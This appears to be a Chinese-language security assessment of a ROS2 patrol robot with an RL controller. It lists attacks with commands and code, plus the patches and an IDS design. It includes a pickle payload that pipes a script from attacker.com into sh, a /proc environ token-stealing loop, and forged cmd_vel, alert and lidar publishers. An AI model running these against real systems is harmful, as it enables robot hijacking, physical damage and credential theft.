## Tier 1 — 訊息層基本攻擊

### 攻擊 A：白名單 prefix 繞過

**攻擊方式**
```bash
ros2 run demo_nodes_py listener --ros-args --remap __node:=_attacker_disguised
```
任何 node 取名 `_xxx`（底線開頭），monitor 都不會警告。

**攻擊原理**
monitor 把所有 `_` 開頭的 node 都視為 ROS2 內部 daemon（例如 `_ros2cli_daemon_xxx`）直接放行。攻擊者只要取名加底線就完全隱身。

**漏洞位置**
[monitor_node.py:28-32](../src/dds_security_monitor/dds_security_monitor/monitor_node.py#L28-L32) (修補前)
```python
_INTERNAL_PREFIXES = frozenset({
    '_',                        # ← 整個底線 prefix 都放行
    'transform_listener_impl',
    'launch_ros',
})
```
判斷邏輯 [monitor_node.py:130](../src/dds_security_monitor/dds_security_monitor/monitor_node.py#L130)：
```python
if any(short.startswith(p) for p in _INTERNAL_PREFIXES):
    continue
```

**攻擊後果**
攻擊者可在工廠 ROS2 網路內長期潛伏，偷聽 `/scan` `/cmd_vel`，monitor 完全看不到。

**修補狀態**：✅ 已修。改為精確 `_ros2cli_` prefix。

### 攻擊 B：偽造 `/security/alerts` 讓所有訂閱者停車

**攻擊方式**
```bash
ros2 topic pub --once /security/alerts std_msgs/msg/String \
    'data: "FAKE ALERT — attacker forced stop"'
```

**攻擊原理**
ROS2/DDS 預設不檢查 publisher 身份。任何在同 domain 內的 node 都能 publish `/security/alerts`。subscriber（`patrol_node` / `burger_env` / `mission_manager_node` / `system_status_node`）一收到字串就觸發 emergency stop，沒驗證來源。

**漏洞位置**
[patrol_node.py:212-218](../src/dds_security_monitor/dds_security_monitor/patrol_node.py#L212-L218) (修補前)
```python
def _cb_alert(self, msg: String) -> None:
    if not self._paused:
        self._paused = True
        self._pub(0, 0)
        self.get_logger().error('🚨 安全警報！巡航停止')
    ...
```
完全沒對 `msg.data` 做任何驗證 → 任何字串都觸發停車。

**雪上加霜**：`burger_env.py` 訂閱用 `TRANSIENT_LOCAL` QoS，啟動時還會收到歷史 alert 訊息 → 訓練開機瞬間就被偽造 alert 殺掉。

**攻擊後果**
工廠中任何被入侵的 IoT 設備（例如連到同 WiFi 的攝影機）都能讓巡邏機器人停 30 秒。攻擊者可挑時機（保全交接、夜間）讓監控失效。

**修補狀態**：✅ 已修。Alert payload 加 HMAC-SHA256 簽章，subscriber 驗章不過直接忽略。

### 攻擊 C：劫持 `/cmd_vel` 注入極端速度

**攻擊方式**
```bash
ros2 topic pub --once /cmd_vel geometry_msgs/msg/TwistStamped \
    '{twist: {linear: {x: 100.0}, angular: {z: 50.0}}}'
```

**攻擊原理**
`/cmd_vel` 是機器人的控制 topic，DDS 不限制誰能 publish。攻擊者塞線速度 100 m/s、角速度 50 rad/s，Gazebo diff_drive plugin 不做 sanity check，直接執行。

**漏洞位置**
DDS 設計層（不是某一行程式碼）。SROS2 Permissive 模式 + 沒限定 `/cmd_vel` 的合法 publisher。

**攻擊後果**
- 訓練中：攻擊者持續發指令，SAC agent 的命令被覆寫，無法學習
- 部署中：機器人撞牆、衝出工廠、傷人

**修補狀態**：🟡 應用層緩解（與攻擊 J 共用 `_check_cmd_vel_publishers`）。
- `burger_env.__init__` 啟動時 query graph，發現 `/cmd_vel` 上有非預期 publisher → log ERROR
- **限制**：只能偵測啟動瞬間就在的攻擊者，後加入的擋不住
- 根本解：SROS2 切 **Enforce** 模式 + permissions.xml 限定 `/cmd_vel` publisher 為 `patrol_node` / `burger_sac_env` enclave

### 攻擊 D：`/patrol/goto` 遠端劫機

**攻擊方式**
```bash
ros2 topic pub --once /patrol/goto std_msgs/msg/String \
    'data: "{\"name\": \"被劫持\", \"x\": 100.0, \"y\": 100.0}"'
```

**攻擊原理**
`patrol_node` 提供 `/patrol/goto` topic 接收動態巡邏目標，但 `_cb_goto` 只做 JSON parse 沒做：
1. publisher 身份驗證（任何人都能發）
2. 座標範圍檢查（攻擊者送 (100, 100) 也接受）
3. `name` 長度限制（可塞超長字串洗版 log）

**漏洞位置**
[patrol_node.py:149-163](../src/dds_security_monitor/dds_security_monitor/patrol_node.py#L149-L163) (修補前)
```python
def _cb_goto(self, msg: String) -> None:
    try:
        d = json.loads(msg.data)
        name = d.get("name", "臨時目標")
        x    = float(d["x"])
        y    = float(d["y"])
    except Exception as e:
        self.get_logger().error(f'/patrol/goto parse error: {e}')
        return
    self._wp  = Waypoint(name=name, x=x, y=y)   # ← 直接使用，不檢查範圍
```

**攻擊後果**
攻擊者可命令巡邏機器人飛到任意座標 — 包括：
- 牆外 (100, 100) → 卡死
- 出入口 (0, -10) → 把機器人「偷走」
- 攻擊者選定地點 → 物理接觸機器人

**修補狀態**：✅ 已修。加座標範圍 ±2.5m 檢查 + `name` 長度限制 40 字。

### 攻擊 H：從 `/proc/<pid>/environ` 偷 LINE token

**攻擊方式**
```bash
for pid in $(pgrep -u jesse); do
    tr '\0' '\n' < /proc/$pid/environ 2>/dev/null | grep "^LINE_CHANNEL_TOKEN="
done
```

**攻擊原理**
Linux 同 user 的所有 process 都能讀 `/proc/<pid>/environ`，這檔案包含該 process 啟動時的全部環境變數。
`source ~/.config/dds-monitor/credentials` 用 `export LINE_CHANNEL_TOKEN=...`，token 從此被所有同 user process 看到。

**漏洞位置**
[credentials](~/.config/dds-monitor/credentials)
```bash
export LINE_CHANNEL_TOKEN=wAgf/K4z2....
export LINE_USER_ID=Ubxxxxxxxxx....
```
+ [monitor_node.py:64-66](../src/dds_security_monitor/dds_security_monitor/monitor_node.py#L64-L66)
```python
self._line_token = (
    os.environ.get('LINE_CHANNEL_TOKEN')   # ← 從 env 讀
    or self.get_parameter('line_token').value
)
```

**攻擊後果**
- 攻擊者拿到 LINE token + USER_ID → 可用 LINE Messaging API 對你發任意訊息（釣魚、騷擾）
- 同 user 不需要 root，只要拿到 jesse 的 shell（透過其他攻擊或 phishing）就能讀

**實測結果**：本機 24 個 process 把 LINE token 放在 env，全部可讀。

**修補狀態**：❌ 未修。建議改用檔案 + `chmod 600`，程式直接讀檔。

## Tier 2 — 進階攻擊

### 攻擊 I：Pickle RCE via replay buffer

**攻擊方式**
```python
import pickle, os
class Evil:
    def __reduce__(self):
        # 反序列化時會執行這個 tuple
        return (os.system, ('curl http://attacker.com/x.sh | sh',))

# 攻擊者覆寫 buffer
with open('~/ros2_ws/.../models_sac/sac_burger_buffer.pkl', 'wb') as f:
    pickle.dump(Evil(), f)
```
下次 `train_sac_auto.sh` 重啟 / resume → 載入 → **任意程式碼執行**。

**攻擊原理**
SB3 的 `model.load_replay_buffer()` 內部用 `pickle.load()`。pickle 反序列化會呼叫 object 的 `__reduce__()` method，攻擊者可以讓 `__reduce__` 回傳 `(os.system, ('cmd',))` → load 時自動執行 `cmd`。

這不是 SB3 的 bug，是 pickle 設計就是這樣（unsafe by design）。

**漏洞位置**
SB3 內部行為 + [train_sac.py:88-89](../src/turtlebot3_dqn/turtlebot3_dqn/train_sac.py#L88-L89)：
```python
if BUFFER_PATH.exists():
    model.load_replay_buffer(str(BUFFER_PATH))   # ← 對攻擊者完全打開的攻擊面
```
+ buffer 檔案權限 `-rw-r--r--`，攻擊者寫得進去。
+ `train_sac_auto.sh` 自動 resume → 攻擊者寫一次，等下次 crash 就觸發。

**攻擊後果**
- 完整 user-context shell（uid=jesse）
- 可以：
  - 偷 SSH key (`~/.ssh/id_rsa`)
  - 把模型權重外洩
  - 種 backdoor 等下次 ssh login
  - 加密 `~/` 勒索

**實測**：執行 `id > PWNED.txt` 成功，產生：
```
uid=1000(jesse) gid=1000(jesse) groups=1000(jesse),4(adm),20,24,25,27,29,30,44,46,100,107,116(docker)
```

**修補狀態**：✅ 已修。
- `monitor_node.py` 加 `sign_file()` / `verify_file()`（HMAC-SHA256，共用 alert_secret）
- `train_sac.py` save buffer 後產生 `.sha256.hmac`，load 前驗章
- 驗章失敗 → `sys.exit(3)` 拒絕 load
- 第一次升級允許 fail-open（沒簽章檔時 warn 並產生新簽）
- 單元測試：改檔/無簽/假簽 → 全擋；正常檔 → 通過

### 攻擊 J：同名 Node 劫持 `/cmd_vel`（DDS race）

**攻擊方式**
```python
# 攻擊者啟動「同名」patrol_node，用 4 倍頻率 publish 倒退
class Evil(Node):
    def __init__(self):
        super().__init__('patrol_node')   # ← 名字跟真的一模一樣
        self.pub = self.create_publisher(TwistStamped, '/cmd_vel', 10)
        self.create_timer(0.05, self._send)  # 20Hz（真 patrol 是 5Hz）
    def _send(self):
        m = TwistStamped()
        m.twist.linear.x = -0.22       # 強制倒退
        m.twist.angular.z = 1.5         # 順便狂轉
        self.pub.publish(m)
```

**攻擊原理**
DDS 不檢查 node 名稱唯一性 — 多個 node 同名完全合法。多個 publisher 對同個 topic publish，subscriber 看到所有訊息（按時間順序）。Gazebo diff_drive plugin 以「最後收到的 cmd」為準。

20Hz vs 5Hz = 4:1 → 攻擊者贏面 80%。

**漏洞位置**
DDS 設計層 + ROS2 沒強制 node 名稱唯一性。

**實測結果**
`ros2 node list` 顯示：
```
/patrol_node
/patrol_node      ← 兩個並存
```
Robot 收到的 cmd 統計：`forward=2 backward=8`（攻擊者控制 80%）。

**攻擊後果**
- 攻擊者不需要關掉真 patrol，「加入」就贏
- monitor 看不到（白名單內有 `patrol_node`）
- 機器人行為被攻擊者主導

**修補狀態**：🟡 應用層緩解（根本解仍需 SROS2 Enforce）。
- `burger_env.__init__` 加 `_check_cmd_vel_publishers()`：啟動掃描 `/cmd_vel` 的 publisher list，發現非預期 node（不在 ALLOWED={`burger_sac_env`, `teleop_keyboard`}）→ log ERROR
- **限制**：只能偵測啟動時就在的攻擊者，後啟動的仍可加入（純應用層擋不住）
- 根本解：SROS2 切 Enforce + permissions.xml 限定 `/cmd_vel` 合法 publisher 為 burger_sac_env / patrol_node enclave

### 攻擊 K：`/scan` Poisoning（RL State Attack）

**攻擊方式**
```python
class Fake(Node):
    def __init__(self):
        super().__init__('fake_lidar')
        self.pub = self.create_publisher(LaserScan, '/scan', qos)
        self.create_timer(0.1, self._send)   # 10Hz
    def _send(self):
        m = LaserScan()
        m.ranges = [3.5] * 360   # 360 度全部 3.5m（完美空曠世界）
        self.pub.publish(m)
```

**攻擊原理**
SAC agent 從 `/scan` 取狀態，攻擊者偽造 LaserScan 就能讓 agent 看到不存在的世界。
- 訓練中：agent 學到「四面八方都沒障礙物 → 全速衝就對了」 → 學到爛策略
- 部署中：真實環境有障礙，但 agent 看 `min_range=3.5` 認為空曠 → 直接撞

這是 RL 領域經典的 **adversarial state attack**。

**漏洞位置**
[burger_env.py:107-108](../src/turtlebot3_dqn/turtlebot3_dqn/burger_env.py#L107-L108)
```python
self._scan_sub = self.create_subscription(LaserScan, "/scan", self._scan_cb, qos)
```
+ [burger_env.py:154](../src/turtlebot3_dqn/turtlebot3_dqn/burger_env.py#L154)：
```python
def _scan_cb(self, msg: LaserScan):
    self._raw_scan = list(msg.ranges)   # ← 無條件信任
```

**實測結果**：SAC victim 持續看到 `min_range = 3.50m`（攻擊者塞的假值），完全沒察覺。

**攻擊後果**
攻擊者只需在工廠 WiFi 內 publish 假 scan 一週，就能讓 SAC 重訓出一個「危險策略」。回到真實環境部署 → 撞東西 → 損失。

**修補狀態**：✅ 已修。
- `burger_env._scan_cb` 加 std 異常偵測：`std(scan) < 0.01` → 視為偽造，跳過此幀
- 真實 lidar 即使空曠處也有測量雜訊（std ≈ 0.03），全相同值的攻擊一定 < 0.01
- 單元測試：
  - 攻擊 K (全 3.5m) → std=0.0000 → ⚠️ 拒絕
  - 攻擊 K (低 noise 攻擊) → std=0.0017 → ⚠️ 拒絕
  - 正常有障礙 → std=0.6872 → ✅ 通過
  - 空曠 + 測量噪音 → std=0.0292 → ✅ 通過
- **未涵蓋**：漸進式攻擊（攻擊者慢慢拉 std）可繞過，這需要結合 source authentication

### 攻擊 L：`/patrol/reload` Service Flood DoS

**攻擊方式**
```python
# 50 個並發 client 同時 call reload
c = node.create_client(Trigger, '/patrol/reload')
futures = [c.call_async(Trigger.Request()) for _ in range(50)]
```

**攻擊原理**
ROS2 預設 `SingleThreadedExecutor` — 所有 callback (service + timer + topic) 排隊在一個 thread 跑。
`patrol_node._srv_reload` 每次呼叫做 yaml IO + 隊列重建（~100ms）。
50 個並發 call × 100ms = 5 秒控制 loop 完全 block，機器人「活鎖」。

**漏洞位置**
[patrol_node.py:103](../src/dds_security_monitor/dds_security_monitor/patrol_node.py#L103)
```python
self.create_service(Trigger, '/patrol/reload', self._srv_reload)
```
+ 沒 rate limit、沒 caller 驗證、沒 multi-threaded executor。

**攻擊後果**
機器人在攻擊期間（持續打 reload）完全無法導航。即使攻擊停了 patrol_node 也要慢慢消化 queue，恢復時間更長。

**修補狀態**：✅ 已修。
- `patrol_node._srv_reload` 加 5 秒 rate limit
- 連續 5 次呼叫驗證：第 1 次過，第 2-5 次回 `success=false, message="rate limited, 請等 X.Xs（防 DoS）"`
- 5.2 秒後第 6 次又能過 → 正常用戶不受影響，攻擊者打不滿
- **未涵蓋**：service flood 仍消耗些許 executor 時間（rate limit 本身要 1ms 比對時間），但 100 次也只佔用 100ms 而非過去的 10 秒

### 攻擊 M：Model file swap（完整性檢查缺失）

**攻擊方式**
```bash
# 訓練完成後攻擊者覆寫 best.zip
cp /tmp/evil_model.zip ~/ros2_ws/src/turtlebot3_dqn/turtlebot3_dqn/models_sac/sac_burger_best.zip
```

**攻擊原理**
- `sac_burger_best.zip` 權限 `-rw-r--r-- jesse jesse` → user 可寫
- 沒 `.sha256` 完整性檔
- 部署用 `SAC.load("sac_burger_best.zip")` 不驗章 → 攻擊者預訓練的惡意策略直接生效

進階版：把 evil_model.zip 內 `data.pkl` 改成 Pickle RCE payload（攻擊 I）→ **load 那一刻直接執行任意程式碼**。

**漏洞位置**
+ 訓練腳本 [train_sac.py:142](../src/turtlebot3_dqn/turtlebot3_dqn/train_sac.py#L142)
```python
model.save(str(LATEST_PATH))    # 沒簽 hash
```
+ 沒對應的 `sha256sum >> best.zip.sha256`
+ 部署 `SAC.load(...)` 不驗章

**攻擊後果**
- 機器人聽攻擊者預訓練的策略
- 若用 Pickle 漏洞：load 那一刻就執行任意程式碼
- 是供應鏈攻擊（supply chain）— 攻擊者不需要在執行時在場

**修補狀態**：✅ 已修。
- `train_sac.py` save latest.zip 後寫 `.sha256.hmac`，load 前驗章
- `BestRewardCallback` save best.zip 後也寫 `.sha256.hmac`
- load 驗失敗 → `sys.exit(2)` 拒絕
- 攻擊者要 forge 簽章必須拿到 `~/.config/dds-monitor/alert_secret`（chmod 600）
- 結合 攻擊 I 的修補 — 同一個 HMAC 機制保護 model + buffer 兩個檔案

| 輸入驗證（範圍 + 長度） | D | `patrol_node._cb_goto` |
| Rate limit | L | `patrol_node._srv_reload` |
| 統計異常偵測（std） | K | `burger_env._scan_cb` |
| 啟動時 graph scan | C, J | `burger_env._check_cmd_vel_publishers` |
| Alert QoS VOLATILE | B (deep) | `burger_env.__init__` |

## 共通根因分析

| 根因 | 影響的攻擊 |
|---|---|
| **DDS Permissive 模式不限制 publisher** | B, C, J, K |
| **缺乏訊息來源認證 (no source auth)** | B, C, D, J, K |
| **缺乏輸入驗證 (no input validation)** | D, B |
| **缺乏完整性檢查 (no integrity check)** | I, M |
| **敏感資訊用環境變數傳遞** | H |
| **Single-threaded executor 設計** | L |
| **白名單比對邏輯過寬** | A |

## 防禦原則建議（給專題報告引用）

1. **Defense in depth** — SROS2 + application-layer HMAC 兩層保護，任一層被破不會全完
2. **Fail-secure default** — 驗章失敗預設「拒絕」而非「放行」
3. **Least privilege** — model/buffer 檔案 root-owned，訓練用獨立 user
4. **Input validation everywhere** — 所有外部進來的資料（topic、service、檔案）都驗範圍 + 格式
5. **Process isolation** — 敏感 token 不放 env，用 chmod 600 檔案
6. **Supply chain integrity** — 模型/資料檔簽 HMAC，部署驗章

## 智能防禦系統 (Intelligent Defense / IDS) — 最後一道防線

### 設計目標
前面修補機制（HMAC 簽章、白名單、輸入驗證）擋的是「假冒身份 / 假冒訊息格式」。
但攻擊者若已**取得合法身份 + 用合法格式做異常行為**，前面防護機制都看不出來。
這是行為層異常偵測（behavioral IDS）要解決的問題 — 看「動作」而非「身份」。

### 4 個 Detector + Voting 機制

實作位置：[intelligent_defense_node.py](../src/dds_security_monitor/dds_security_monitor/intelligent_defense_node.py)

| Detector | 偵測對象 | 觸發條件 |
|---|---|---|
| **D1** Physics | cmd_vel 超物理上限 | `|lin| > 0.5 m/s` 或 `|ang| > 4.5 rad/s` |
| **D2** Oscillation | cmd_vel 高頻翻轉 | 最近 N 幀 70%+ 方向異號 |
| **D3** Repetition | scan 連續幀重複 | `max(|Δscan|) < 0.005m` |
| **D4** Publisher | /cmd_vel /scan 多 publisher | publisher count > 1 |

**投票**：任 2/4 觸發 → 發 HMAC 簽章 alert 到 `/security/alerts`（patrol/burger_env/mission_manager 等驗章後決定是否 emergency stop）

**Cooldown**：兩次 alert 間最少 10 秒，防止洗版

### 驗證結果

| 攻擊 | 預期觸發 | 實測結果 |
|---|---|---|
| **C** cmd_vel hijack 100 m/s | D1 + D4 | ✅ vote=2 達門檻，alert 發出，HMAC 簽章正確 |
| **J** 同名 patrol race | D2 + D4 | 🟡 D2 偵測到（flip_ratio=1.00），實戰加 D4 可達門檻 |
| **K-5** 進階假 scan | D3 | ⚠️ D3 對「每幀 reseed noise」無效，需 SROS2 限定來源 |
| 正常 patrol 行為 | 全部不觸發 | ⚠️ 測試環境 zombie process 干擾，未乾淨驗證 |

### 啟動方式

```bash
source ~/ros2_ws/install/setup.bash
ros2 run dds_security_monitor intelligent_defense_node
```

可跟 monitor_node 並存（兩者都 publish 簽章 alert 到 `/security/alerts`）。

### 防禦堆疊（完整三層）

```
攻擊者
   │
   ▼
┌─────────────────────────────────────────────┐
│ Layer 1: SROS2 (Permissive 目前; 改 Enforce  │  阻擋偽造身份
│         可擋 C/J 根本問題)                    │
└─────────────────────────────────────────────┘
   │
   ▼
┌─────────────────────────────────────────────┐
│ Layer 2: Application checks                  │  阻擋已知模式
│ - monitor 白名單 + LINE alert                │
│ - HMAC alert/file 簽章                       │
│ - patrol_node 座標範圍 + rate limit          │
│ - burger_env scan std + publisher 掃描       │
└─────────────────────────────────────────────┘
   │
   ▼
┌─────────────────────────────────────────────┐
│ Layer 3: Behavioral IDS（本節點，最後防線）   │  偵測異常「動作」
│ - D1~D4 多角度 + Voting (≥2)                │
│ - HMAC 簽章 alert 整合進現有 alert pipeline  │
└─────────────────────────────────────────────┘
```

### 限制（誠實寫出）

- D3 對「動態 noise + 假障礙物」的 K-5 進階攻擊無效
- D2 單獨觸發不發 alert（需配 D4），所以攻擊者只啟動「一個」evil publisher（不跟真 patrol 競爭）能繞過
- 不主動阻斷（只發 alert），靠下游 subscriber 自行決定如何反應
- 測試環境 zombie process 干擾較大，需要額外做完整 staging 測試
